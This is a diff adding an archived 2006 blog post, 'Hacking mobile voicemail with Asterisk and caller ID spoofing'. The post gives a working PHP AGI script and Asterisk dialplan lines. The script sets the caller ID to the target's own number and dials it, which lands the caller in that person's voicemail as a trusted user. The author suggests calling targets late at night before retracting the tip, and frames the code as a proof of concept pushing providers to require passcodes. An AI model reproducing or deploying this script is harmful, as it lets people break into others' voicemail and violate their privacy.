@@ -1,0 +1,168 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+      <meta charset="utf-8">
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <link rel="shortcut icon" href="/favicon.ico">
+      
+      <title>Hacking mobile voicemail with Asterisk and caller ID spoofing &middot; Writing by Harper Reed</title>
+      <meta name="description" content="">
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.3/jquery.min.js"></script>
+      <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
+      <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-hQpvDQiCJaD2H465dQfA717v7lu5qHWtDbWNPvaTJ0ID5xnPUlVXnKzq7b8YUkbN" crossorigin="anonymous">
+
+      <link rel="alternate" type="application/rss+xml" title="Writing by Harper Reed" href="">
+      <meta name="google-site-verification" content="UhNsUFmIygSV6JDvpCaxIJs2mQLgTvuKcFG5epZZiCg" />
+      <link rel="stylesheet" href="/css/main.css">
+      <script type="application/ld+json">
+    {
+      "@context": "http://schema.org",
+      "@type": "Person",
+      "name": "Harper Reed",
+      "url": "http://www.harperreed.com",
+      "sameAs": [
+        "https://instagram.com/harperreed",
+        "https://www.linkedin.com/in/harperreed",
+        "https://twitter.com/harper"
+      ]
+    }
+      </script>
+    
+  </head>
+  <body>
+    <div class="container">
+
+    
+      <header class="page-header">
+        
+
+      <div class="wrapper">
+        <ul class="nav nav-pills pull-right">
+            
+            <li class="presentation">
+              <a href="/about/">About</a>
+            </li>
+            
+            <li class="presentation">
+              <a href="/history/archives/">Historical Archives</a>
+            </li>
+            
+        </ul>
+        <h1><a class="page-title" href="/"><i class="fa fa-pencil" aria-hidden="true"></i> Writing by Harper Reed</a></h1>
+      </div>
+    
+    </header>
+
+
+
+    
+    <div class="page-content">
+      
+<nav>
+  <ul class="pager">
+    <li class="previous"><a href="/history/archives/"><span aria-hidden="true">&larr;</span> Back home</a></li>
+  </ul>
+</nav>
+<div class="post" style="padding-bottom: 50px;">
+
+  <div >
+    <h1 ><a title="Permanent Link to Hacking mobile voicemail with Asterisk and caller ID spoofing." href="/2006/09/24/hacking-mobile-voicemail-with-asterisk-and-caller-id-spoofing/" rel="bookmark">Hacking mobile voicemail with Asterisk and caller ID spoofing</a> <br /><small>Posted on Sep 24, 2006</small></h1>
+  </div>
+  <div class="postcontent">
+    <p>So there has always had a problem with US mobile providers having their voicemail be susceptible to being compromised by calling with a spoofed caller id. Apparently most providers caller id apps just checks the referring callerid - and doesn&rsquo;t force the voicemail user to pick a passcode; so it allows someone to trick the voicemail app into believing they are calling from a trusted number.</p>
+
+<p>This has been covered all <a href="http://www.toast442.org/C662738431/E680925937/index.html">over the</a> <a href="http://www.i-hacked.com/content/view/124/47">Internet</a> and was in the <a href="http://www.macdevcenter.com/pub/a/mac/2005/01/01/paris.html">spotlight</a> awhile back when it was alleged that this was how <a href="http://blog.tmcnet.com/blog/tom-keating/mobile-phones/paris-hilton-hacks-voicemail-using-asterisk.asp">Paris Hilton&rsquo;s mobile phone was hacked</a>. It is a pretty big problem and is probably really easy to fix.</p>
+
+<p>So, just to make things funnier - I decided that I would release a snippit of code that would make it easier to execute this hack.
+<blockquote>#!/asterisk/php/bin/php -q
+&lt;?</p>
+
+<p>set_time_limit(30); //make sure the php script doesn&rsquo;t time out
+require(&lsquo;phpagi.php&rsquo;); // include the phpagi class
+error_reporting(E_ALL);  // limit the errors</p>
+
+<p>$agi = new AGI(); // instantiate the AGI class
+$agi-&gt;answer(); // answer the phone
+sleep(2); // wait a sec or two</p>
+
+<p>$agi-&gt;stream_file(&lsquo;enter_spoof&rsquo;); // speak a wav file that says &ldquo;enter the number&rdquo;
+$result = $agi-&gt;get_data(&lsquo;beep&rsquo;, 3000, 10); // beep and grab the 10 numbers
+$agi-&gt;verbose(&ldquo;Number to call:&ldquo;.$result[&lsquo;result&rsquo;]); // throw info so you know whats up
+$agi-&gt;set_callerid($result[&lsquo;result&rsquo;]); // set caller id to the number you are calling
+$agi-&gt;exec(&ldquo;Dial IAX2/iax-provider/1&rdquo;.$result[&lsquo;result&rsquo;]); // call the number</p>
+
+<p>?&gt;</blockquote>
+You can add this to your /var/lib/asterisk/agi-bin dir and then specify the extension you want to use to dial and execute the php/agi script
+<blockquote>exten =&gt; 666,1,Answer
+exten =&gt; 666,2,AGI(tmobilevoicemail_spoof.php)
+exten =&gt; 666,3,Hangup</blockquote>
+Then when you dial 666  it executes the script. It will ask you what number to dial then dial it after setting the caller id to the same number. It will dial the number and then ring the phone. If the phone is on and the target number is answered - it won&rsquo;t work; however if the person doesn&rsquo;t answer you will be placed in the targets voicemail as a trusted user. So, I would suggest calling people in the middle of the night or when you know they will not answer. Wait.. I actually wouldn&rsquo;t suggest calling anyone but yourself.</p>
+
+<p>It seems to me that the only viable solution that will be compatible with all phones, people and providers is to force the users to choose passcode to your voicemail.</p>
+
+<p>This is - of course - a proof of concept. You should not actually hack peoples voicemails. That is not very nice.  We are into being nice.</p>
+
+<p>Also, check out my <a href="http://www.nata2.org/2006/02/14/caller-id-spoofing-with-php-and-asterisk/">previous entry on caller id spoofing</a>.</p>
+
+  </div>
+</div>
+
+<hr>
+
+
+
+
+<h3>See Also</h3>
+<ul>
+  
+  <li><a href="/2006/09/18/thoughts-about-the-deck-and-pagerank./">Thoughts about The DECK and PageRank.</a> <small>published on Sep 18, 2006</small></li>
+  
+  <li><a href="/2006/07/24/how-to-sync-your-phone-ical-and-google-calendar-together./">How to sync your phone, iCal and Google Calendar together.</a> <small>published on Jul 24, 2006</small></li>
+  
+  <li><a href="/2006/07/18/six-aparts-vox---nice-work..-good-aggregation...-but-i-dont-want-another-blog./">Six Apart&#39;s Vox - nice work.. good aggregation... but i don&#39;t want another blog. </a> <small>published on Jul 18, 2006</small></li>
+  
+  <li><a href="/2006/09/24/goddamn-fancy-phones/">Goddamn fancy phones</a> <small>published on Sep 24, 2006</small></li>
+  
+  <li><a href="/2006/09/23/blogs.nata2.org/">blogs.nata2.org</a> <small>published on Sep 23, 2006</small></li>
+  
+</ul>
+
+
+<hr>
+
+<nav>
+  <ul class="pager">
+  
+    <li class="previous"><a href="/2006/09/25/weekend.-phones.-blog-design./" title="Previous: Weekend. Phones. blog design."><span aria-hidden="true">&larr;</span> Previous entry </a></li>
+  
+  
+    <li class="next"><a href="/2006/09/24/goddamn-fancy-phones/" title="Next: Goddamn fancy phones">Next entry <span aria-hidden="true">&rarr;</span></a></li>
+  
+  </ul>
+</nav>
+
+    </div>
+      <footer class="footer">
+    
+      <br /><br />
+        <p class="text-muted small"><b><i class="fa fa-camera-retro" aria-hidden="true"></i> Writing by Harper Reed</b> &middot; Copyright &copy; Harper Reed &middot; Contact <a href="mailto:harper@nata2.org">Harper Reed</a> &middot; Generated @ Jul 8, 2018</p>
+    
+      </footer>
+      <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-70650-74', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+
+    </div>
+  </body>
+</html>
